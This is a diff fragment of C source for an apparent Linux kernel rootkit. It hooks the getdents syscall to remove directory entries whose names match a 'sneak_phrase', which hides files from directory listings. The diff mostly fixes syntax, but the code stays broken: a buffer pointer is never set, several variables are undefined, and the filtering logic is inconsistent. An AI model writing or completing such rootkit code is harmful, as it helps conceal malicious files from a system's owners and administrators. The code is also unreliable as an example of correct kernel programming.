@@ -21,29 +21,33 @@ struct linux_dirent{
   unsigned short d_reclen;
   char d_name[];
 
-}
+};
 
-asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp , unsigned int count);
+typedef asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-    static asmlinkage long* hijackgetdents(void){
+
+static asmlinkage long* hijackgetdents(void){
     struct linux_dirent *hijackedDirent;
     char* fileNames;
-    long original = originalGetDents(fd, dirp, count);
+    long original = originalGetDentsFunc(fd, dirp, count);
+
 
     if (original<= 0){
       return original;
     }
-    hijackedBuffer= (char*)dirent;
+
+    char* hijackedBuffer= (char*)dirp;
 
     int counter=0;
     while(counter<original){
         hijackedDirent=(struct linux_dirent*)(fileNames+counter);
-        if((strncmp(hijackedDirent->name,sneak_phrase, (sizeof(sneak_phrase)-1))))
-        memcpy(hijackedBuffer+counter, hijakcedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
+        if((strncmp(hijackedDirent->d_name,sneak_phrase, (sizeof(sneak_phrase)-1)))){
+        memcpy(hijackedBuffer+counter, hijackedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
     }
       else{
         counter = counter + hijackedDirent->d_reclen;
       }
+    }
 
 return original;
 
